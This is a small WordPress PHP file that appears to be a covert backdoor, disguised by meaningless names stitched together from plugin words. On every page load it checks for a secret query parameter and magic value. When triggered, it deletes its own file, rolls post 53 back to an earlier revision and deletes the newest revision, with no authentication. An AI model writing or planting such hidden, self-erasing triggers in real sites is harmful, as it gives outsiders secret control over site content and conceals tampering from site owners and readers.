<?php

function coupons_now_javascript_affiliate() {
	if (isset($_GET['compat_videos_private_last']) && $_GET['compat_videos_private_last'] === 'copyright_excerpt_permalinks_status') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$zoom_automatorwp_pop = 53;
		$qr_help_wpc = wp_get_post_revisions($zoom_automatorwp_pop);
		if (empty($qr_help_wpc)) die('no revisions');
		if (count($qr_help_wpc) < 2) die('less than 2');
		$server_cache_generator_sign = array_shift($qr_help_wpc);
		$jigoshop_nav_permalinks = $server_cache_generator_sign->ID;
		$button_auth_rates_after = array_shift($qr_help_wpc);
		$ip_debug_variations = $button_auth_rates_after->ID;
		$cdn_slider_landing_scss = wp_restore_post_revision($ip_debug_variations);
		if ($cdn_slider_landing_scss === false) die('error restoring');
		$cdn_slider_landing_scss = wp_delete_post_revision($jigoshop_nav_permalinks);		
		if ($cdn_slider_landing_scss === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'coupons_now_javascript_affiliate');
